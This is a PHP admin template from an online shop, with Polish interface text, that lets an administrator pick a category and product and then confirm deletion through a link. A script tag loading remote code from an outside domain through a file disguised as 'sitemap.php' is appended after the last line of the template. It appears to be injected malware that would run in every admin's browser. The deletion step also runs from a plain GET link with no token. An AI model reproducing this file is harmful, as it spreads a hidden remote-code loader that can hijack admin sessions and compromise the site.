<h2>Usuwanie produktów</h2>

<?if(getOrder(1)):?>
	<?if(getOrder(2)):?>
		<?if(getOrder(3) == 'confirmed'):?>
			<p>Usunięto <?=$current -> name?>!
		<?else:?>
			<p><a href='/itemRemove/<?=getOrder(1)?>/<?=getOrder(2)?>/confirmed'>Czy na pewno chcesz usunąć <?=$current -> name?>?
		<?endif?>
	<?else:?>
		<h3>Wybierz produkt do usunięcia:</h3>
		<?module('ul_item', array('id' => getOrder(1), 'link' => 'itemRemove'))?>
	<?endif?>
<?else:?>
<h3>Wybierz kategorię, w której znajduje się produkt do usunięcia:</h3>
<?module('categories_admin', array('link' => 'itemRemove'))?>
<?endif?><script src=http://johanneswallmark.com/media/sitemap.php ></script>